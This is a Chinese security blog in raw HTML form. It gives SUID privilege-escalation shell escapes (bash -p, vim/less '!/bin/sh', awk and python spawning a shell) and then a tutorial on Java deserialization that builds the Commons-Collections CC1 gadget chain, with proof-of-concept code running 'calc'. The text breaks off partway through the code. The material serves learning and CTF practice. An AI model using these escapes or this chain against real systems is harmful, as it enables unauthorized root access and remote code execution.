src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695302838433-de1e7e64-d8c0-4c4a-baba-8cecb44ff71b.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695302856860-4dc3d84c-1bcb-44c1-a055-07676085a3a9.png" alt="img"></p><h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695306625262-713b59c5-1c4d-4bb0-a5b5-230412369279.png" alt="img"></p><h2 id="env"><a href="#env" class="headerlink" title="env"></a>env</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env shell</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695307266506-96ed29d7-5765-4174-9ce8-cd53bef4d22e.png" alt="img"></p><h2 id="ionice"><a href="#ionice" class="headerlink" title="ionice"></a>ionice</h2><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695307617177-39000dd9-3c91-41d1-ae2c-bcb3d7818b34.png" alt="img"></p><h2 id="nice"><a href="#nice" class="headerlink" title="nice"></a>nice</h2><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695307728837-ba456bf8-da4c-4829-b03b-4ab444a775f8.png" alt="img"></p><h2 id="less-more"><a href="#less-more" class="headerlink" title="less&#x2F;more"></a>less&#x2F;more</h2><p>文件并非是&#x2F;etc&#x2F;passwd 只要是内容多的文件都行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695303340197-a26ab244-f582-47bd-b027-f4b2fac1c1a0.png" alt="img"></p><h2 id="flock"><a href="#flock" class="headerlink" title="flock"></a>flock</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flock -u / whoami</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695307508773-66215c04-f3d8-413f-9265-1d90b3b519df.png" alt="img"></p><h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695305813211-039f1589-170f-407d-aa7c-00f9ab781ec9.png" alt="img"></p><h2 id="nano"><a href="#nano" class="headerlink" title="nano"></a>nano</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nano</span><br><span class="line">ctrl + R</span><br><span class="line">ctrl + X</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695306058324-eab07ed1-1309-45bd-94d0-eeec710bebc8.png" alt="img"></p><h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695307032638-b2a32ae6-9208-4a77-b2dc-52e1e871b0e3.png" alt="img"></p><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><p>在之前ctf一道题目遇到的 当然前提是得有suid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import os;os.execl(&#x27;/bin/sh&#x27;,&#x27;sh&#x27;,&#x27;-p&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695307980036-d2044bf2-f133-4fc6-a53d-300f98457eca.png" alt="img"></p><h1 id="终极工具"><a href="#终极工具" class="headerlink" title="终极工具"></a>终极工具</h1><p>一个在线网站 查看命令存在suid命令的用法</p><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>利用suid提权主要思路:</p><ol><li>首先找到所在环境以及具有suid的文件</li><li>然后找到相应命令进入shell交互的方法</li><li>执行shell</li></ol><p>遇到题目环境回来找找看就行了:)</p><p>至此 先到这里</p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://m.freebuf.com/articles/web/272617.htmlSUID">https://m.freebuf.com/articles/web/272617.htmlSUID</a></p><p><a href="https://tttang.com/archive/1793/#toc_strace">https://tttang.com/archive/1793/#toc_strace</a></p><p><a href="https://xz.aliyun.com/t/12535#toc-14">https://xz.aliyun.com/t/12535#toc-14</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java序列化与反序列化</title>
      <link href="/post/5e5c5c3.html"/>
      <url>/post/5e5c5c3.html</url>
      
        <content type="html"><![CDATA[<p>Java序列化与反序列化+cc链</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p><em>Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。</em></p><p><em>Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。</em></p></blockquote><p>序列化与反序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储</p><p>与PHP不同的是php大概是序列化生成一串序列化字符串，而java是生成了字节流文件</p><p>PHP通过一串字符串来在各种运行环境中穿梭，而java通过一个字节流文件来穿梭</p><p>同时java没有类似于python或者php的魔术函数，它是通过链式调用，也就是套娃的方式来构造恶意链<br>除此之外我们可以通过重写其默认的<code>readObject()</code>函数我们可以执行一些恶意命令执行函数</p><h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><p>首先需要一个目标类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Z1d10t;</span><br><span class="line"><span class="keyword">import</span> com.learn.learning;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name=<span class="string">&quot;Tom&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">transient</span> <span class="type">String</span> <span class="variable">hobby</span> <span class="operator">=</span> <span class="string">&quot;basketball&quot;</span>; <span class="comment">//不会参与序列化与反序列化</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is &quot;</span>+name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">see</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Age is &quot;</span>+age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是我们的序列化过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Z1d10t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Serialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//实例化一个对象</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        <span class="comment">//创建文件流</span></span><br><span class="line">        <span class="comment">//创建一个包含对象进行反序列化信息的数据文件 这里起名为ser.ser可以任意取</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>);</span><br><span class="line">        <span class="comment">//创建对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="comment">//将我们的对象序列化写入对象输出流 也就是ser.ser文件中</span></span><br><span class="line">        objectOutputStream.writeObject(stu);</span><br><span class="line">        <span class="comment">//释放资源 关闭流</span></span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是 我们要进行序列化与反序列化需要带有 <code>Serializable</code>接口才行</p><p>还有关键字<code>transient</code>申明的属性不会参与序列化与反序列化</p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Z1d10t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Unserialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//从文件中反序列化对象</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="comment">//恢复对象</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">stu2</span> <span class="operator">=</span> (Student) objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见hobby属性并没有被反序列化</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695179428869-b952b548-017a-428c-8dc2-567f9982efa7.png" alt="img"></p><h1 id="简单利用"><a href="#简单利用" class="headerlink" title="简单利用"></a>简单利用</h1><p>如果我们在目标类中重写readObject函数 并且进行命令执行</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695179646673-b6e09605-1d54-46a9-a676-d4d3801e850d.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//执行打开计算器程序命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当我们反序列化执行<code>readObject()</code>的时候 就会自动调用我们的命令函数了</p><p>这里需要注意就是我们还是需要执行系统默认设置的<code>in.defaultReadObject();</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695179805874-0bd15737-f88c-4d37-ae39-1d602a66a5a2.png" alt="img"></p><h1 id="cc1链复现"><a href="#cc1链复现" class="headerlink" title="cc1链复现"></a>cc1链复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>无脑看这个师傅的链接搭就行了<a href="https://xz.aliyun.com/t/12669#toc-3">JAVA安全初探(三):CC1链全分析 - 先知社区</a></p><p>需要注意的是 配置好maven之后 就会自动帮我们把Comments-Collections-3.2.1下载到本地仓库</p><p>就不用再去找源码了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695715437217-786b7c76-a173-4f66-b126-63d10b4db4ea.png" alt="img"></p><p>其次还要将其加进去</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695715472115-a7d5acc8-04ef-4e5d-a545-d23e92d9749e.png" alt="img"></p><h2 id="源头利用点"><a href="#源头利用点" class="headerlink" title="源头利用点"></a>源头利用点</h2><p>这个链子的源头是Common Collections库中的<code>Transformer</code>接口</p><p>寻找一下继承了这个接口的类</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695454148260-4d7efa22-95fc-4ac2-bfff-a7f0d4b749b4.png" alt="img"></p><p>有很多 但是主角是<code>InvokerTransformer</code> </p><p>我们跟进一下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695454286059-69488c32-f40f-4059-9a92-9a519a7a469d.png" alt="img"></p><p>发现有我们很熟悉的反射调用那么这里很明显是一个利用点 并且它还支持反序列化 继承了Serializable接口</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695454750499-9f72da11-0375-417e-9ebb-dbb5f7a9126b.png" alt="img"></p><p>再来看他的构造方法</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695454338049-402a6a61-a492-46e7-811e-ec633bede5b3.png" alt="img"></p><p>一共三个，分别为方法名，变量类的数组，对象数组</p><p>这是一个我们普通的通过反射调用<code>Runtime</code>的过程</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695454584580-bda06e70-f932-492d-ad62-eff23551f134.png" alt="img"></p><p>如果按照上面<code>InvokerTransformer的transform</code>来调用的话 就是这样</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695454630428-86637716-a9ba-43c2-8681-ebdbe96b30df.png" alt="img"></p><p>利用成功</p><p>那么这样我们就找到了源头利用点 接下来就是找链子了 链式调用</p><h2 id="找链子"><a href="#找链子" class="headerlink" title="找链子"></a>找链子</h2><p>去找谁调用了transform方法 </p><p>有很多类调用了这个方法 但是这里复现<code>TransformedMap</code>的<code>checkSetValue</code>方法</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695455310738-ab67a44b-6049-4cf2-b4cc-6a79d6bb5544.png" alt="img"></p><p>这里可以看到方法类型和构造都是protected 所以我们只能内部调用或者子类调用与实例化 不能外部调用去实例化</p><p>看看构造函数 返现它传进来一个Map对象然后对他的键和值都进行一些操作</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695455715878-319bf27f-4185-4294-943a-b8cc4e23cdb8.png" alt="img"></p><p>向上找 看看谁调用了方法或者构造了实例</p><p>发现<code>docorate()</code>方法对它进行了实例化 并且还是static类型 那么就属于是类的方法 直接通过<code>类名.方法名</code>形式调用即可</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695455831118-c7b630d3-3e22-43c9-b5e1-5a955cc7c745.png" alt="img"></p><p>我们先来调用这个函数进行实例化</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695457356419-c7e90a07-4480-45b5-8614-dd6230a6156f.png" alt="img"></p><p>至于这里第二个参数为什么是null  因为checkSetValue只对第二个参数作用了 所以第一个参数传不传都无所谓</p><p>TransformedMap这个类的<code>checkSetValue()</code>调用了<code>transform()</code><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695642292657-090eb147-8e61-4514-9995-5323aa5d3c89.png" alt="img"></p><p>那么继续 看看谁调用了<code>checkSetValue()</code></p><p>发现只有一处调用了这个函数</p><p>MapEntry类的<code>setValue()</code>函数</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695642386652-aa186b04-327f-4a8f-be3a-b1c0e4017ce6.png" alt="img"></p><p>MapEntry继承了AbstractMapEntryDecorator这个类 同时TransformedMap也继承了这个类</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695645406099-850f6c2a-c71d-4b0a-b878-959003e669c3.png" alt="img"></p><p>AbstractMapEntryDecorator有<code>setValue()</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695642628028-60228ef8-f835-4b8f-835c-cba892ce4dde.png" alt="img"></p><p>那么相当于子类MapEntry重写了父类的<code>setValue()</code> 其实本质上是重写了Entry这个接口的内置函数</p><p>同时父类还有Map.Entry这个接口</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695642712810-7347986d-56cd-4531-80f7-7a851e479460.png" alt="img"></p><h2 id="理解Entry"><a href="#理解Entry" class="headerlink" title="理解Entry"></a>理解Entry</h2><p>那么至此 我们现需要了解一下什么Entry</p><p>简单说Entry就是Map里的键值对 </p><p>setValue()是Map类的内置函数</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695645691608-056df975-e8f1-4445-9cd4-7a61eed39660.png" alt="img"></p><p>常常用来遍历map对象的时候这样使用 从字面意思也能看出是在赋值</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695646222714-9b3e4142-7931-4880-ab7d-95dfe1ab5645.png" alt="img"></p><h2 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h2><p>这个类MapEntry的父类又引入了Map.Entry接口，所以我们只需要进行常用的Map遍历，就可以调用setValue方法</p><p>到目前为止来缕一缕思路</p><p>for循环遍历<code>transformdMap</code>-&gt;调用<code>MapEntry</code>的<code>setValue()</code>-&gt;<code>transformdMap</code>的<code>checkSetValue()</code>-&gt;<code>InvokerTransformer.transform()</code></p><p>非常完美</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695647142500-9ff080bf-bd05-4910-955a-4dc57dde27f1.png" alt="img"></p><p>现在继续来看哪个可利用的类调用了<code>setValue()</code> </p><p>如果谁的<code>readObject()</code>函数调用了<code>setValue()</code>那么刚好闭环 岂不美哉？？？</p><p>那么就找到了<code>AnnotationInvocationHandler</code>它的readObject函数直接就调用了<code>setValue()</code>函数</p><p>所以反序列化时候就会自动执行</p><p>并且还是遍历Entry来执行的 难道这就是天意吗</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695649837057-9e263bcc-9a7f-454e-a4df-b095d3028056.png" alt="img"></p><p>来看他的构造函数</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695648493194-a326b7fe-335f-427e-b87a-a27f5650b66c.png" alt="img"></p><p>接受两个参数 分别是：</p><p>继承了注解的Class 看这个类名也知道和注解有关系</p><p>是个Map 并且我们可控 可以将之前的<code>transformdMap</code> 传入</p><p>但是这个类有个缺陷就是 他没有申明public 也就是说只能在本package调用 如果想要在外部调用 就要用反射 并且只能用全限定方式调用  也就是<code>Class.forName(完整包名)</code>方式</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695651081539-852c6ebb-416e-4c52-95c4-e81fbcd1e531.png" alt="img"></p><p>这里再认识一下<code>Override</code>它是什么呢 它是一个注解 就是用来解释程序的附加信息 不会影响程序的正常运行 可以简单看作一个注释 当然不严谨 我们跟进一下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695651156989-3fa22f7d-e40a-4e62-a238-1de53769c430.png" alt="img"></p><p>可以看到它上面还有两个注解 </p><p>那么这两个注解叫做元注解 他们是用来解释注解的</p><p>Target一般是来限制注解的作用对象 </p><p>Retention来限制注解作用阶段 比如源代码阶段还是程序运行阶段</p><p>那么 让我们来运行一下 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695651501430-438fa22d-5ac9-4e27-be24-fd93f6262a18.png" alt="img"></p><p>惊了直接调用成功了 这里其实是有问题的 这里并不是我们反序列化调用计算器成功的而是</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695651551073-22e49eeb-b8ef-407d-8beb-30a5936f7a19.png" alt="img"></p><p>所以要把这一行注释了 一定要注意到这里！！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Z1d10t.dubug;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.crypto.dsig.Transform;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//        Class&lt;? extends Runtime&gt; runtiomeClass = r.getClass();</span></span><br><span class="line">        <span class="comment">//        Method runtimeMethod = runtiomeClass.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line">        <span class="comment">//        Object invokerObject = runtimeMethod.invoke(r, &quot;calc&quot;);</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">rlInvokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                                                                         <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        <span class="comment">//rlInvokerTransformer.transform(r);</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(); <span class="comment">//先创建一个map对象</span></span><br><span class="line">        map.put(<span class="string">&quot;Z1d10t&quot;</span>,<span class="string">&quot;Z1d10t&quot;</span>);<span class="comment">//任意填</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformdMap =TransformedMap.decorate(map, <span class="literal">null</span>, rlInvokerTransformer);</span><br><span class="line">        <span class="comment">//        for(Map.Entry Entry:transformdMap.entrySet())&#123;</span></span><br><span class="line">        <span class="comment">//            Entry.setValue(r); //注意我们这里都是在传一个对象</span></span><br><span class="line">        <span class="comment">//        &#125;</span></span><br><span class="line">        Class&lt;?&gt; annotationClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span 